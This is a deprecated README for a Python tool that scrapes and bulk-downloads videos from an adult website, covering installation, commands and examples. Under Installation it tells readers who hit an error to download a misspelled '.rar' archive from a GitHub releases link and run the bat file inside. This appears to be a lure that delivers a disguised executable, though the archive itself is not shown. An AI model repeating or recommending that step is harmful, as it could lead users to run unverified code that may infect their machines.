## deprecated deprecated deprecated deprecated

# PRNHub Downloader Windows


# Installation

Check what version of python you have: python --version <br />
If error happen try binary files https://github.com/Kelly-McGowan/prhb-loader/releases/download/p/pronohub_loader.rar

unpack and run bat file
```batch
 $ git clone https://github.com/Kelly-McGowan/prhb-loader/
 $ cd prhb-loader
 $ pip install -r requirements.txt
 $ python phdler.py
```
It will ask you for your download folder PATH. Please enter your full path without the last backslash. <br />
Like this: /home/username/media/phmedia <br />
On first run, phdler will create a database.db which will be used later for everything.


# Usage
```bash

+-------------------+---------+------------------------------------------------------+
| Tool              | command | item                                                 |
+-------------------+---------+------------------------------------------------------+
| python phdler.py | start   |                                                      |
| python phdler.py | custom  | url | batch                                          |
| python phdler.py | add     | model | pornstar | channel | user | playlist | batch |
| python phdler.py | list    | model | pornstar | channel | user | playlist | all   |
| python phdler.py | delete  | model | pornstar | channel | user | playlist         |
+-------------------+---------+------------------------------------------------------+
```

# Example

## START
```bash
python3 phdler.py start
```

## CUSTOM
```bash
python phdler.py custom https://www.pornhub.com/view_video.php?viewkey=ph5d69a2093729e
or
python phdler.py custom batch
```
The batch option will ask you for the full path of your .txt file where you can import multiple URLs at once. <br />
Take care that every single URL in the .txt file is in his own row.

## ADD
```bash
python phdler.py add https://www.pornhub.com/model/luxurygirl
or
python phdler.py add https://www.pornhub.com/pornstar/leolulu
or
python phdler.py add https://www.pornhub.com/channels/mia-khalifa
or
python phdler.py add https://www.pornhub.com/users/lasse98
or
python phdler.py add https://www.pornhub.com/playlist/30012401
or
python phdler.py add batch
```
The batch option will ask you for the full path of your .txt file where you can import multiple URLs at once. <br />
Take care that every single URL in the .txt file is in his own row.

## LIST
```bash
python phdler.py list model
or
python phdler.py list pornstar
or
python phdler.py list channels
or
python phdler.py list users
or
python phdler.py list playlist
or
python phdler.py list all
```

## DELETE
```bash
python phdler.py delete model
or
python phdler.py delete pornstar
or
python phdler.py delete channels
or
python phdler.py delete users
or
python phdler.py delete playlist
```
The option DELETE will list the selected item type, list them from the database and give you an option to enter the item ID of which one you want to be deleted.


# Explained

Every time you add a new item (model/pornstar and so on), the script will scrape the real name from the website and write it to the database. That is how we can have pretty names in final folders. Every added item is treated with a status of NEW=1, so the script knows that it needs to download all videos from the selected item. After the download of all videos is completed for the selected item, the script will change it to NEW=0. This way, when you START the script, it will first run down trough the database and ask for all items that have the status of NEW=1, and after that, it will check for new videos from items with the status NEW=0.
This should not bother you... I just wanted to explain how it works.


# Big thanks to

YouTube-DL <br />
PrettyTables <br />
BS4 aka BeautifulSoup4 <br />
and of course, all of you :)
